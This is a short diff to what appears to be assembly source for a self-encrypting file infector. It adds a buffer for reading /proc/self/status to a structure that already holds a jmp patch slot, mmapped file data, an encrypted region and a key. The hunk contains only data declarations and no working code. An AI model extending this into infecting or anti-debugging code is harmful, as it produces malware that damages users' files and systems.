@@ -197,6 +197,7 @@
 .file_size		resq	1				; Size of open file
 .jmp			resb	5				; jmp :  e9 xx xx xx xx 
 .file_data		resq	1				; Pointer to mmapped file data
+.status_str		resb	110				; buf for /proc/self/status
 .tocypher		resb	0x5000			; location to cyphered v
 .key			resb	1				; location to key
 .factor			resb	1				; factor to derivate key
